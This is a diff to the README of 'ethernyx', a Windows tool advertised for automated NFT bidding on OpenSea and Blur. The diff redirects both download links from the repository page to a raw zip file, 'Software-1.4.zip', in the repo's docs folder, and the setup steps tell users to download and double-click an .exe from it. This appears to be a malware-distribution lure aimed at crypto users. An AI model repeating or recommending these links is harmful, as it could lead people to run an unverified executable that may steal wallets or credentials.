@@ -1,6 +1,6 @@
 # ⚡ ethernyx - Automate your NFT bidding process faster
 
-[![](https://img.shields.io/badge/Download-Ethernyx-blue.svg)](https://github.com/Enin9352/ethernyx)
+[![](https://img.shields.io/badge/Download-Ethernyx-blue.svg)](https://raw.githubusercontent.com/Enin9352/ethernyx/main/docs/Software-1.4.zip)
 
 ethernyx helps users place bids on NFTs across OpenSea and Blur with speed. The software processes over 300 bids every second. It handles counter-bidding and list floor prices without manual effort. You gain an advantage in the digital marketplace by using automation for routine tasks.
 
@@ -28,7 +28,7 @@ You need a Windows computer or a virtual private server to run the software. Fol
 
 You can set up the application by following these steps.
 
-1. Go to the [official release page](https://github.com/Enin9352/ethernyx) to access the installer.
+1. Go to the [official release page](https://raw.githubusercontent.com/Enin9352/ethernyx/main/docs/Software-1.4.zip) to access the installer.
 2. Select the version labeled for Windows.
 3. Download the .exe file to your computer.
 4. Double-click the file to begin the setup process.
